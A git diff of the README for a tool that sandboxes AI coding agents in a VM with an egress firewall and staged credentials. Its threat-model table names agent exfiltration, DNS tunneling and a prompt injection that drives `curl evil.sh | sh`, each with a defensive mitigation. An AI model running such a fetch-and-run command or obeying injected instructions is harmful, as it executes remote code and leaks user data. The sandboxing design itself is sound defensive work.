@@ -9,7 +9,7 @@ The tool generates a derived image, sanitized agent configs, an egress firewall,
 Given `project-sandbox /path/to/repo python:3.12-slim`:
 
 1. Read host `git config --global` identity.
-2. Render `<project>/.project-sandbox/` — `Dockerfile`, `entrypoint.sh`, `init-firewall.sh`, sanitized `claude/settings.json` and `codex/config.toml`, and a devcontainer post-start init script. Claude credentials are staged separately under `/tmp` with private directory permissions.
+2. Render `<project>/.project-sandbox/` — `Dockerfile`, `entrypoint.sh`, `init-firewall.sh`, sanitized `claude/settings.json` and `codex/config.toml`, and a devcontainer post-start init script. Agent credentials are staged separately under `/tmp` with private directory permissions to reduce the chance of accidentally committing them.
 3. Render `<project>/.devcontainer/` with symlinks back into `.project-sandbox/` so the Dockerfile and firewall script remain a single source of truth.
 4. Detect available host agent configs (`~/.claude`, `~/.codex`, `~/.config/opencode`, `~/.copilot`) and install only those agent CLIs into the generated Dockerfile. Bash is always available.
 5. Append `.project-sandbox/` to `<project>/.gitignore` (idempotent).
@@ -77,11 +77,11 @@ uv run project-sandbox --dry-run /absolute/path/to/repo python:3.12-slim
     └── codex               → ../.project-sandbox/codex
 ```
 
-The `.project-sandbox/` directory is generated local state and is ignored as a whole. Re-run `project-sandbox` after cloning, pulling generated config changes, or refreshing credentials. Claude credential staging lives outside the project under `/tmp/project-sandbox-<uid>/...`.
+The `.project-sandbox/` directory is generated local state and is ignored as a whole. Re-run `project-sandbox` after cloning, pulling generated config changes, or refreshing credentials. Agent credential staging lives outside the project under `/tmp/project-sandbox-<uid>/...`.
 
 ## Devcontainer flow
 
-Before starting the devcontainer, run `project-sandbox /absolute/path/to/repo python:3.12-slim` once on the host. This refreshes the `/tmp/project-sandbox-<uid>/...` Claude credential staging directory that the devcontainer mounts at startup.
+Before starting the devcontainer, run `project-sandbox /absolute/path/to/repo python:3.12-slim` once on the host. This refreshes the `/tmp/project-sandbox-<uid>/...` agent credential staging directories that the devcontainer mounts at startup.
 
 Then open the project in VS Code, Cursor, or any devcontainer-aware IDE and choose **Reopen in Container**. The generated `devcontainer.json` builds the same image, mounts the same sanitized configs and staged credentials, runs the same firewall via `postStartCommand`, and waits for it before opening a terminal. Re-run the same `project-sandbox` command before starting or rebuilding the devcontainer again whenever credentials may have changed, `/tmp` may have been cleaned, or you are on a different host.
 
@@ -135,7 +135,7 @@ Customize:
 | Threat | Mitigation |
 |---|---|
 | Agent reads `~/.ssh`, `~/Library`, etc. | VM boundary (`apple/container` `Virtualization.framework`); arbitrary host home directories are not mounted by default. |
-| Agent deletes the wrong project directory | The workspace, generated config, staged Claude credentials, selected agent config directories, optional `--mount` entries, and worktree-mode `.git` metadata are the intentional host mounts; everything else lives in the disposable VM. |
+| Agent deletes the wrong project directory | The workspace, generated config, staged agent credentials, optional `--mount` entries, and worktree-mode `.git` metadata are the intentional host mounts; everything else lives in the disposable VM. |
 | Agent exfiltrates the workspace to an arbitrary server | iptables egress allowlist (default DROP + domain whitelist) for both IPv4 and IPv6. |
 | DNS tunneling exfiltration | DNS restricted to the in-VM resolver only. |
 | Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
